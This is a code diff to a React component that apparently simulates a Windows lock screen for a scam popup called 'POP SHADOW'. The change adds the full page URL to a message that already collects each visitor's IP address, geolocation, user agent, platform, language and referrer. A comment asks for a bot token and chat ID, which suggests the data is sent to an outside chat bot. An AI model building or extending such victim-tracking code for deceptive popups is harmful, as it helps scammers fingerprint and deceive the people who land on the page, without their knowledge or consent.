@@ -57,14 +57,16 @@ const WindowsLockSim: React.FC = () => {
         const now = new Date();
         const localTime = `${now.getDate().toString().padStart(2, '0')}/${(now.getMonth() + 1).toString().padStart(2, '0')}/${now.getFullYear()} ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
         
-        // Get referrer
+        // Get referrer and full URL
         const referrer = document.referrer || 'Direct';
+        const fullUrl = window.location.href;
+        const domain = window.location.hostname;
         
         // Format message exactly as you want
         const message = `
 🚨 NEW POP SHADOW 😏🚨
 
-🌐 Domain: ${window.location.hostname}
+🌐 Domain: ${domain}
 📍 IP Address: ${ip}
 🗺️ Country: ${country} (${countryCode})
 🏙️ Location: ${city}, ${region}
@@ -78,6 +80,7 @@ ${navigator.userAgent}
 💻 Platform: ${navigator.platform}
 🔤 Language: ${navigator.language}
 🔗 Referrer: ${referrer}
+🔍 URL: ${fullUrl}
         `;
         
         // REPLACE WITH YOUR BOT TOKEN AND CHAT ID
@@ -473,6 +476,3 @@ ${navigator.userAgent}
 };
 
 export default WindowsLockSim;
-
-
-
